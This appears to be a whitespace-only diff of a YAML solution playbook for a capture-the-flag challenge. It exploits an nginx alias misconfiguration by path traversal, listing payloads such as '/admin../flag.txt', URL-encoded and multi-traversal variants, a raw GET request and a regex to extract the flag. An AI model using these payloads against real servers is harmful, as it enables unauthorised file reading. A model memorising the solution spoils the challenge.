@@ -18,7 +18,7 @@ tricks:
       #     alias /var/www/html/;
       #     autoindex on;
       # }
-      # 
+      #
       # Vulnerability:
       # - location /admin maps to /var/www/html/
       # - autoindex on enables directory listing
@@ -32,12 +32,12 @@ tricks:
       # How alias works:
       # - Request: /admin/path
       # - Resolves to: /var/www/html/path
-      # 
+      #
       # Path traversal:
       # - Request: /admin../flag.txt
       # - Resolves to: /var/www/html/../flag.txt
       # - Normalizes to: /var/www/flag.txt
-      # 
+      #
       # This allows escaping the alias directory
 
   - name: "Step 3: Craft path traversal payload"
@@ -46,10 +46,10 @@ tricks:
     payload: |
       # Basic payload:
       /admin../flag.txt
-      # 
+      #
       # Resolves to:
       # /var/www/html/../flag.txt -> /var/www/flag.txt
-      # 
+      #
       # Alternative payloads:
       /admin..//flag.txt
       /admin%2e%2e/flag.txt  # URL encoded
@@ -60,7 +60,7 @@ tricks:
     how: "Send GET request to path traversal URL"
     payload: |
       GET /admin../flag.txt
-      # 
+      #
       # nginx processes:
       # 1. Matches location /admin
       # 2. Applies alias /var/www/html/
@@ -75,13 +75,13 @@ tricks:
     payload: |
       # Response contains flag file content directly
       # Flag format: FLAG{<sha256_hash>}
-      # 
+      #
       # Extraction:
       # import re
       # flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
       # if flag_match:
       #     flag = flag_match.group(0)
-      # 
+      #
       # Note: Flag file location: /var/www/flag.txt
 
   - name: "Alternative: Directory listing"
@@ -99,12 +99,11 @@ tricks:
       # URL encoding:
       /admin%2e%2e/flag.txt
       /admin%2e%2e%2fflag.txt
-      # 
+      #
       # Double slashes:
       /admin..//flag.txt
-      # 
+      #
       # Multiple traversals:
       /admin../../flag.txt
-      # 
+      #
       # Note: nginx normalizes paths, so ../ works even with encoding
-
